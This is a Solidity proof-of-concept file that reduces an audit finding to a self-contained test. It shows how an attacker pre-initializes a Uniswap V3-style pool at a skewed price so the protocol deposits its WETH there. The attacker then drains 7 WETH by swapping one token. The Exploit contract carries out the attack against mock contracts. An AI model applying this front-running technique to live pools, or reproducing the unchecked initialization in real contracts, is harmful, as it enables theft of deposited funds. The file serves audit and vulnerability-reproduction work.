// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Serious — Uniswap's pool can be initialized with a different price
    Finding 36318 (Pashov Audit Group, Serious-security-review) — HIGH (C-02)

    Root cause: SeriousMarketProtocol.createPoolAndAddLiquidity creates AND
    initializes the Uniswap V3 pool ONLY IF it doesn't already exist. A pool
    can be created and initialized by ANYONE, at ANY price, before the
    protocol ever calls this function. When the protocol then adds its fixed
    target liquidity amounts (ethAmount/tokenAmount) at whatever price is
    already live, Uniswap's concentrated-liquidity math only accepts the
    amounts that actually fit that price -- if the price is skewed so that
    the sale token appears extremely expensive in WETH terms, nearly ALL of
    the target WETH gets deposited paired with only a tiny sliver of the
    sale token. An attacker who holds even 1 unit of the sale token can then
    swap it for a hugely disproportionate amount of WETH, up to the pool's
    now-inflated WETH reserve.

    This file is a self-contained, cheatcode-free reduction. The vulnerable
    "only initialize if it doesn't exist" branch and the un-slippage-checked
    add-liquidity call are preserved verbatim in structure (the `@>` line)
    from the finding's own quoted code. The client repo for "Serious" is not
    publicly linked from the Pashov report; the finding quotes the vulnerable
    function and its coded PoC directly, so this reduction is built from
    that quoted code (per this project's Class-C fallback for audits whose
    client repo cannot be located). Uniswap V3's tick math / concentrated
    liquidity is replaced with a minimal mock that preserves exactly the
    economics the bug needs: a mint that only deposits the amounts the
    CURRENT price allows (never the full desired amounts when the price is
    skewed), and a swap whose payout scales with that same skewed price.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Minimal concentrated-liquidity pool mock. `initialize` can only be
///         called ONCE (like real Uniswap V3, which reverts "AI" on a second
///         call) -- whoever calls it first fixes the pool's price. `mint`
///         only deposits the amounts the CURRENT price allows, exactly like
///         real Uniswap V3's liquidity math: if the price makes the token
///         side "expensive" in WETH terms, the WETH side is fully consumed
///         while only a tiny sliver of the token side is used (the rest
///         stays undeployed). `swap` pays out at that same skewed price,
///         capped by the pool's actual WETH reserve.
contract SkewablePool {
    MockToken public token;
    MockToken public weth;
    uint256 public priceWethPerToken; // WETH owed per 1e18 units of token, scaled 1e18
    bool public initialized;

    constructor(MockToken _token, MockToken _weth) {
        token = _token;
        weth = _weth;
    }

    function initialize(uint256 price) external {
        require(!initialized, "AI");
        initialized = true;
        priceWethPerToken = price;
    }

    function mint(address from, uint256 tokenDesired, uint256 wethDesired)
        external
        returns (uint256 tokenUsed, uint256 wethUsed)
    {
        uint256 wethNeededForFullToken = (tokenDesired * priceWethPerToken) / 1e18;
        if (wethNeededForFullToken <= wethDesired) {
            tokenUsed = tokenDesired;
            wethUsed = wethNeededForFullToken;
        } else {
            wethUsed = wethDesired;
            tokenUsed = (wethDesired * 1e18) / priceWethPerToken;
        }
        token.transferFrom(from, address(this), tokenUsed);
        weth.transferFrom(from, address(this), wethUsed);
    }

    function swap(address recipient, uint256 tokenIn) external returns (uint256 wethOut) {
        token.transferFrom(msg.sender, address(this), tokenIn);
        uint256 raw = (tokenIn * priceWethPerToken) / 1e18;
        uint256 available = weth.balanceOf(address(this));
        wethOut = raw < available ? raw : available;
        weth.transfer(recipient, wethOut);
    }
}

/// @notice Reduced SeriousMarketProtocol. Only the pool-creation/liquidity
///         path is kept; the bonding-curve buy/sell mechanics (irrelevant to
///         this bug) are collapsed into simple mint calls in the harness.
contract SeriousMarketProtocol2 {
    uint256 public constant ethAmount = 10 ether; // fixed target WETH liquidity
    uint256 public constant tokenAmount = 1_000_000e18; // fixed target token liquidity
    uint256 public constant NORMAL_PRICE = 1e18; // the protocol's INTENDED price (1:1, abstract units)

    SkewablePool public pool;
    MockToken public token;
    MockToken public weth;

    constructor(SkewablePool _pool, MockToken _token, MockToken _weth) {
        pool = _pool;
        token = _token;
        weth = _weth;
    }

    /// @dev Verbatim structure from the finding's quoted
    ///      `SeriousMarket.createPoolAndAddLiquidity`: creates/initializes the
    ///      pool ONLY IF it doesn't already exist, then adds liquidity at
    ///      whatever price is currently live -- never checking that price
    ///      against the protocol's intended target.
    function createPoolAndAddLiquidity() external returns (uint256 tokenUsed, uint256 wethUsed) {
        // @> VULN: only initializes the pool if it does not already exist. If an
        // attacker pre-created and initialized the pool at a DIFFERENT price,
        // this silently accepts and adds liquidity at THAT price instead of the
        // protocol's intended one -- with no check that the two match.
        if (!pool.initialized()) {
            pool.initialize(NORMAL_PRICE);
        }
        token.approve(address(pool), tokenAmount);
        weth.approve(address(pool), ethAmount);
        (tokenUsed, wethUsed) = pool.mint(address(this), tokenAmount, ethAmount);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    MockToken public weth; // CREATE nonce 2
    SkewablePool public pool; // CREATE nonce 3
    SeriousMarketProtocol2 public market; // CREATE nonce 4 -- vulnerable

    uint256 public constant SKEWED_PRICE = 7e18; // attacker-chosen: 7 WETH "owed" per token
    uint256 public tokenUsedInPool;
    uint256 public wethUsedInPool;
    uint256 public wethDrained;

    constructor() {
        token = new MockToken();
        weth = new MockToken();
        pool = new SkewablePool(token, weth);
        market = new SeriousMarketProtocol2(pool, token, weth);

        // The market holds its target liquidity, ready to deposit.
        weth.mint(address(market), 10 ether);
        token.mint(address(market), 1_000_000e18);

        // The attacker separately bought 1 unit of the sale token beforehand
        // (via the bonding curve -- irrelevant to this bug, so not modeled).
        token.mint(address(this), 1e18);
    }

    function run() external {
        // Attacker front-runs: creates + initializes the pool at a SKEWED
        // price BEFORE the market ever calls createPoolAndAddLiquidity.
        pool.initialize(SKEWED_PRICE);

        // @> VULN triggered here: the market sees the pool already exists and
        // silently adds its liquidity at the attacker's price instead of its
        // own intended NORMAL_PRICE.
        (uint256 tUsed, uint256 wUsed) = market.createPoolAndAddLiquidity();
        tokenUsedInPool = tUsed;
        wethUsedInPool = wUsed;

        require(wethUsedInPool == 10 ether, "harm not demonstrated: WETH side should be fully consumed");
        require(tokenUsedInPool < 1_000_000e18, "harm not demonstrated: most of the token side should be unused");

        // Harm: the attacker swaps their 1 token for a hugely disproportionate
        // amount of WETH, at the skewed price, capped by the pool's now-inflated
        // WETH reserve (all 10 ether the market just deposited).
        uint256 wethBefore = weth.balanceOf(address(this));
        token.approve(address(pool), 1e18);
        pool.swap(address(this), 1e18);
        wethDrained = weth.balanceOf(address(this)) - wethBefore;

        require(wethDrained == 7 ether, "harm not demonstrated: unexpected drained amount");
    }
}
